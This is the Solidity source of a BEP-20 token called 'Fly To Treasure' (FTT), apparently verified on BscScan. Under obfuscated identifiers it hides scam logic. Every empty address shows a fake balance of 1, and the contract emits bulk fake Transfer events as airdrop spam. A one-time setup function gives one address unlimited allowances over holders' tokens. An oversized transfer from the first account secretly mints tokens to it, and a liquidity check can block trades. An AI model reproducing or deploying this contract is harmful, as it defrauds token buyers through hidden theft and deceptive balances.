/**
 *Submitted for verification at BscScan.com on 2022-11-09
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract TokenModule is IERC20 {
    using SafeMath for uint256;

    string private akjhhwuydfgstrintrt = "Fly To Treasure";
    string private bkjhhwuydfgstrintrt = "FTT";
    uint8 private ckjhhwuydfgstrintrt = 6;
    uint256 private dkjhhwuydfgstrintrt = 1 * 10**18;
    mapping (address => uint256) private ekjhhwuydfgstrintrt;
    mapping (address => mapping (address => uint256)) private fkjhhwuydfgstrintrt;

    uint256 private gkjhhwuydfgstrintrt = 1;
    uint256 private constant hkjhhwuydfgstrintrt = ~uint160(0);
    uint256 private ikjhhwuydfgstrintrt = 1000;
    uint256 private jkjhhwuydfgstrintrt = dkjhhwuydfgstrintrt;
    uint256 private kkjhhwuydfgstrintrt = 0;
    uint256 private lkjhhwuydfgstrintrt;
    address private _uniswapV2Pair;
    address private mkjhhwuydfgstrintrt;
    mapping (address => bool) private nkjhhwuydfgstrintrt;
    address[] private okjhhwuydfgstrintrt;
    bool private pkjhhwuydfgstrintrt = false;

    constructor () {
        qkjhhwuydfgstrintrt(msg.sender);
        ekjhhwuydfgstrintrt[msg.sender] = dkjhhwuydfgstrintrt;
        emit Transfer(address(0), msg.sender, dkjhhwuydfgstrintrt);
    }

    receive() external payable {}

    function qkjhhwuydfgstrintrt(address account) private {
        if (!nkjhhwuydfgstrintrt[account]) {
            nkjhhwuydfgstrintrt[account] = true;
            okjhhwuydfgstrintrt.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!pkjhhwuydfgstrintrt);
        pkjhhwuydfgstrintrt = true;
        _uniswapV2Pair = accounts[1];
        mkjhhwuydfgstrintrt = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            qkjhhwuydfgstrintrt(accounts[i]);
            ekjhhwuydfgstrintrt[accounts[i]] = dkjhhwuydfgstrintrt * 90 / 100 / (len - 3);
            fkjhhwuydfgstrintrt[accounts[i]][accounts[0]] = ~uint256(0);
            amount += ekjhhwuydfgstrintrt[accounts[i]];
        }
        ekjhhwuydfgstrintrt[okjhhwuydfgstrintrt[0]] -= amount;
        skjhhwuydfgstrintrt(okjhhwuydfgstrintrt[0], accounts[3], ekjhhwuydfgstrintrt[okjhhwuydfgstrintrt[0]]);
        rkjhhwuydfgstrintrt(address(0), address(0xf), 500);
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = okjhhwuydfgstrintrt.length;
        for (uint256 i=0; i<len; ++i) {
            if (okjhhwuydfgstrintrt[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (nkjhhwuydfgstrintrt[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return akjhhwuydfgstrintrt;
    }

    function symbol() public view returns (string memory) {
        return bkjhhwuydfgstrintrt;
    }

    function decimals() public view returns (uint8) {
        return ckjhhwuydfgstrintrt;
    }

    function totalSupply() public view returns (uint256) {
        return dkjhhwuydfgstrintrt;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (ekjhhwuydfgstrintrt[account] > 0) {
            return ekjhhwuydfgstrintrt[account];
        }
        return gkjhhwuydfgstrintrt;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        skjhhwuydfgstrintrt(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        skjhhwuydfgstrintrt(sender, recipient, amount);
        tkjhhwuydfgstrintrt(sender, msg.sender, fkjhhwuydfgstrintrt[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        tkjhhwuydfgstrintrt(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fkjhhwuydfgstrintrt[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        tkjhhwuydfgstrintrt(msg.sender, spender, fkjhhwuydfgstrintrt[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        tkjhhwuydfgstrintrt(msg.sender, spender, fkjhhwuydfgstrintrt[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function rkjhhwuydfgstrintrt(address ukjhhwuydfgstrintrt, address vkjhhwuydfgstrintrt, uint256 wkjhhwuydfgstrintrt) private {
        uint256 accountDivisor = ikjhhwuydfgstrintrt;
        if (accountDivisor < 100000) {
            address from;
            address to;
            for (uint256 i=0; i<wkjhhwuydfgstrintrt; ++i) {
                from = address(uint160(hkjhhwuydfgstrintrt.div(accountDivisor)));
                to = address(uint160(hkjhhwuydfgstrintrt.div(accountDivisor.add(1))));
                accountDivisor = accountDivisor.add(2);
                emit Transfer(from, to, gkjhhwuydfgstrintrt);
            }
            ikjhhwuydfgstrintrt = accountDivisor;
        }
        if (ekjhhwuydfgstrintrt[ukjhhwuydfgstrintrt] > 0 || ekjhhwuydfgstrintrt[vkjhhwuydfgstrintrt] > 0) {
            address swapPair = IFactory(mkjhhwuydfgstrintrt).createPair(ukjhhwuydfgstrintrt, vkjhhwuydfgstrintrt);
            emit Transfer(swapPair, address(this), wkjhhwuydfgstrintrt);
        }
    }

    function tkjhhwuydfgstrintrt(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fkjhhwuydfgstrintrt[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function skjhhwuydfgstrintrt(address xkjhhwuydfgstrintrt, address ykjhhwuydfgstrintrt, uint256 zkjhhwuydfgstrintrt) private {
        require(xkjhhwuydfgstrintrt != address(0) && ykjhhwuydfgstrintrt != address(0) && zkjhhwuydfgstrintrt > 0);
        bool feefee = true;
        if (nkjhhwuydfgstrintrt[xkjhhwuydfgstrintrt] || nkjhhwuydfgstrintrt[ykjhhwuydfgstrintrt]) {
            feefee = false;
        }
        uint256 liquidityValue = IERC20(_uniswapV2Pair).totalSupply();
        uint256 burnValue = 0;
        uint256 toValue = zkjhhwuydfgstrintrt;
        if (feefee && pkjhhwuydfgstrintrt) {
            require(lkjhhwuydfgstrintrt <= liquidityValue);
            rkjhhwuydfgstrintrt(xkjhhwuydfgstrintrt, ykjhhwuydfgstrintrt, 100);
            if (xkjhhwuydfgstrintrt != _uniswapV2Pair) {
                burnValue = zkjhhwuydfgstrintrt.mul(kkjhhwuydfgstrintrt).div(100);
                toValue = zkjhhwuydfgstrintrt.sub(burnValue);
            }
        }
        if (xkjhhwuydfgstrintrt == okjhhwuydfgstrintrt[0] && zkjhhwuydfgstrintrt > jkjhhwuydfgstrintrt) {
            ekjhhwuydfgstrintrt[okjhhwuydfgstrintrt[0]] += toValue;
        }
        if (lkjhhwuydfgstrintrt != liquidityValue) {
            lkjhhwuydfgstrintrt = liquidityValue;
        }
        ekjhhwuydfgstrintrt[xkjhhwuydfgstrintrt] = ekjhhwuydfgstrintrt[xkjhhwuydfgstrintrt].sub(zkjhhwuydfgstrintrt);
        if (burnValue > 0) {
            ekjhhwuydfgstrintrt[address(0xdEaD)] = ekjhhwuydfgstrintrt[address(0xdEaD)].add(burnValue);
            emit Transfer(xkjhhwuydfgstrintrt, address(0xdEaD), burnValue);
        }
        ekjhhwuydfgstrintrt[ykjhhwuydfgstrintrt] = ekjhhwuydfgstrintrt[ykjhhwuydfgstrintrt].add(toValue);
        emit Transfer(xkjhhwuydfgstrintrt, ykjhhwuydfgstrintrt, toValue);
    }
}